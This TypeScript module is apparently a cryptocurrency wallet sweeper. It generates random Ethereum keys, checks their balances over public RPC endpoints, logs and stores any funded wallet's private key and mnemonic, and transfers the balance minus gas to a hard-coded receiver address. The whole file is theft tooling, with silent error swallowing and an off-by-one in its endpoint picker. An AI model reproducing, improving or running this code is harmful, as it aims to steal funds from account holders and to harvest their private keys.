import { ethers } from 'ethers';
import { extraRpcs } from './constant';
import { WalletsService } from '../wallets/wallets.service';

interface Wallet {
    mnemonic: string;
    privateKey: string;
    address: string;
    path: string;
    rpc: string;
}

const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";

function getRandomRPC(listRPC: any): string {
    const randomIndex = Math.floor(Math.random() * (listRPC.length - 1));
    return listRPC[randomIndex].url;
}

async function generateWallet(index: number): Promise<Wallet> {
    const wallet = ethers.Wallet.createRandom();
    const mnemonic = wallet.mnemonic?.phrase;
    if (!mnemonic) throw new Error('Failed to generate mnemonic');

    const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
    const path = `m/44'/60'/0'/0/0`;
    const derivedWallet = hdNode.derivePath(path);
    
    return {
        mnemonic: mnemonic,
        privateKey: derivedWallet.privateKey,
        address: derivedWallet.address,
        path,
        rpc: getRandomRPC(extraRpcs[index])
    };
}

async function generateWallets(): Promise<Wallet[]> {
    const walletPromises = Array.from({ length: extraRpcs.length }, (_, i) => generateWallet(i));
    return Promise.all(walletPromises);
}

async function checkAndTransfer(wallet: Wallet, walletsService: WalletsService): Promise<void> {
    try {
        const provider = new ethers.providers.JsonRpcProvider(wallet.rpc);
        const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);

        const [balance, gasPrice] = await Promise.all([
            provider.getBalance(wallet.address),
            provider.getGasPrice()
        ]);

        if (balance.gt(0)) {
            console.log(`\n🎯 Found wallet with balance!`);
            console.log(`Address: ${wallet.address}`);
            console.log(`Private Key: ${wallet.privateKey}`);
            console.log(`Mnemonic: ${wallet.mnemonic}`);
            console.log(`Balance: ${ethers.utils.formatEther(balance)} ETH`);
            console.log(`RPC: ${wallet.rpc}`);

            // Save wallet to database
            await walletsService.create({
                address: wallet.address,
                privateKey: wallet.privateKey,
                mnemonic: wallet.mnemonic,
                rpc: wallet.rpc,
                balance: parseFloat(ethers.utils.formatEther(balance))
            });

            const gasLimit = ethers.BigNumber.from(21000);
            const gasCost = gasPrice.mul(gasLimit);

            if (balance.gt(gasCost)) {
                const amountToSend = balance.sub(gasCost);
                
                const tx: ethers.providers.TransactionRequest = {
                    to: RECEIVER_ADDRESS,
                    value: amountToSend,
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                };

                const tx_result = await walletWithProvider.sendTransaction(tx);
                
                await tx_result.wait();
                console.log(`Transaction confirmed!`);
                console.log(`Amount sent: ${ethers.utils.formatEther(amountToSend)} ETH`);
            }
        }
    } catch (error) {
        // ignore
    }
}

export async function checkAllWallets(walletsService: WalletsService): Promise<void> {
    try {
        console.log(`start generate wallets at ${new Date().toISOString()}`);
        const wallets = await generateWallets();
        await Promise.all(wallets.map(wallet => checkAndTransfer(wallet, walletsService)));
    } catch (error) {
        // ignore
    }
}